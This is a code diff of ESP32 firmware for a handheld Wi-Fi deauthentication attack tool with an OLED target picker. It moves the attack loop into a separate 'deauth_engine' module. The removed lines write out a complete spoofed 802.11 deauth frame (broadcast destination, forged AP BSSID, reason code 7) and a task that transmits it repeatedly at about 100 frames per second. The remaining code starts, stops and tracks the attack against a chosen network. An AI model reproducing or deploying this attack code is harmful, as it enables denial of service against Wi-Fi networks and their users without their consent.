@@ -1,7 +1,7 @@
 #include "wifi_attack.h"
 #include "wifi_scan.h"
+#include "deauth_engine.h"
 #include "ssd1306.h"
-#include "esp_wifi.h"
 #include "esp_log.h"
 #include "esp_timer.h"
 #include "freertos/FreeRTOS.h"
@@ -10,18 +10,6 @@
 #include <stdio.h>
 
 static const char *TAG = "wifi_attack";
-
-// 802.11 deauth frame — Addr2/Addr3 filled with target BSSID at attack start
-// Reason 7: Class 3 frame received from non-associated station
-static const uint8_t deauth_template[26] = {
-    0xC0, 0x00,                                     // Frame Control: deauth
-    0x3A, 0x01,                                     // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Addr1: broadcast (all clients)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Addr2: AP BSSID (filled)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Addr3: AP BSSID (filled)
-    0x00, 0x00,                                     // Seq Control
-    0x07, 0x00,                                     // Reason Code 7
-};
 
 typedef enum {
     ATTACK_STATE_PICK = 0,
@@ -33,38 +21,15 @@ static uint16_t           scroll_offset = 0;
 static uint16_t           selected_idx  = 0;
 static uint16_t           target_count  = 0;
 
-// Snapshot of scan results used by the picker (static — no locking needed)
 static wifi_ap_info_t     targets[MAX_SCAN_RESULTS];
 
-// Active target fields
 static uint8_t  target_bssid[6];
 static uint8_t  target_channel;
 static char     target_ssid[33];
-
-// Stats updated by the attack task
-static volatile uint32_t packets_sent  = 0;
-static volatile bool     attacking     = false;
-static TaskHandle_t      attack_task_h = NULL;
-static int64_t           attack_start_us = 0;
-
-static void attack_task(void *arg) {
-    uint8_t frame[26];
-    memcpy(frame, deauth_template, sizeof(frame));
-    memcpy(frame + 10, target_bssid, 6);    // Addr2 = spoofed AP
-    memcpy(frame + 16, target_bssid, 6);    // Addr3 = BSSID
-
-    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
-
-    while (attacking) {
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-        if (err == ESP_OK) packets_sent++;
-        vTaskDelay(pdMS_TO_TICKS(10));  // ~100 pps max rate
-    }
-
-    vTaskDelete(NULL);
-}
+static int64_t  attack_start_us = 0;
 
 void wifi_attack_init(void) {
+    deauth_engine_init();
     ESP_LOGI(TAG, "Attack module ready");
 }
 
@@ -80,7 +45,6 @@ void wifi_attack_enter(void) {
         return;
     }
 
-    // No scan results — auto-scan with a cheeky notice
     ssd1306_clear_buffer();
     ssd1306_draw_header("Deauth", "lazy scan...");
     ssd1306_draw_string(0, 3, "Too lazy 2 scan");
@@ -125,27 +89,31 @@ void wifi_attack_select(void) {
     strncpy(target_ssid, targets[selected_idx].ssid, 32);
     target_ssid[32] = '\0';
 
-    packets_sent     = 0;
-    attacking        = true;
-    attack_start_us  = esp_timer_get_time();
-    state            = ATTACK_STATE_RUNNING;
+    deauth_target_t t = {0};
+    memcpy(t.bssid, target_bssid, 6);
+    t.channel = target_channel;
 
-    xTaskCreate(attack_task, "deauth", 2048, NULL, 6, &attack_task_h);
+    attack_start_us = esp_timer_get_time();
+    state           = ATTACK_STATE_RUNNING;
+
+    deauth_engine_start(&t, 1);
     ESP_LOGI(TAG, "Attack started: %s ch%u", target_ssid, target_channel);
 }
 
 void wifi_attack_stop(void) {
-    attacking     = false;
-    attack_task_h = NULL;
-    state         = ATTACK_STATE_PICK;
-    ESP_LOGI(TAG, "Attack stopped: %lu frames sent", (unsigned long)packets_sent);
+    if (!deauth_engine_is_running()) {
+        state = ATTACK_STATE_PICK;
+        return;
+    }
+    deauth_engine_stop();
+    state = ATTACK_STATE_PICK;
+    ESP_LOGI(TAG, "Attack stopped: %lu frames sent",
+             (unsigned long)deauth_engine_get_frames());
 }
 
 bool wifi_attack_is_running(void) {
-    return attacking;
+    return deauth_engine_is_running();
 }
-
-// ---------- render helpers ----------
 
 static const char *auth_short(uint8_t sec) {
     switch (sec) {
@@ -192,9 +160,7 @@ static void render_running(void) {
 
     int64_t elapsed_s = (esp_timer_get_time() - attack_start_us) / 1000000;
     if (elapsed_s < 1) elapsed_s = 1;
-    uint32_t pps = packets_sent / (uint32_t)elapsed_s;
 
-    // Yellow zone: target SSID + elapsed time
     char elapsed[16];
     int64_t m = elapsed_s / 60;
     int64_t s = elapsed_s % 60;
@@ -202,8 +168,9 @@ static void render_running(void) {
     ssd1306_draw_string(0, 0, target_ssid[0] ? target_ssid : "Hidden");
     ssd1306_draw_string(0, 1, elapsed);
 
-    // Blue zone
     char line[17];
+    uint32_t frames = deauth_engine_get_frames();
+    uint32_t pps    = deauth_engine_get_pps();
 
     snprintf(line, sizeof(line), "Ch:%-2u  %s",
              target_channel, target_channel > 14 ? "5GHz" : "2.4G");
@@ -216,7 +183,7 @@ static void render_running(void) {
              target_bssid[3], target_bssid[4], target_bssid[5]);
     ssd1306_draw_string(0, 4, line);
 
-    snprintf(line, sizeof(line), "Sent: %lu", (unsigned long)packets_sent);
+    snprintf(line, sizeof(line), "Sent: %lu", (unsigned long)frames);
     ssd1306_draw_string(0, 5, line);
 
     snprintf(line, sizeof(line), "~%lu pps LN>stop", (unsigned long)pps);
@@ -226,16 +193,17 @@ static void render_running(void) {
 }
 
 void wifi_attack_render(void) {
-    if (state == ATTACK_STATE_RUNNING) {
+    if (state == ATTACK_STATE_RUNNING && deauth_engine_is_running()) {
         render_running();
     } else {
+        if (state == ATTACK_STATE_RUNNING) state = ATTACK_STATE_PICK;
         render_picker();
     }
 }
 
-uint32_t    wifi_attack_get_frames(void)      { return packets_sent; }
-const char *wifi_attack_get_target(void)      { return target_ssid; }
-int64_t     wifi_attack_get_elapsed_ms(void)  {
-    if (!attacking || attack_start_us == 0) return 0;
+uint32_t    wifi_attack_get_frames(void)     { return deauth_engine_get_frames(); }
+const char *wifi_attack_get_target(void)     { return target_ssid; }
+int64_t     wifi_attack_get_elapsed_ms(void) {
+    if (!deauth_engine_is_running() || attack_start_us == 0) return 0;
     return (esp_timer_get_time() - attack_start_us) / 1000LL;
 }
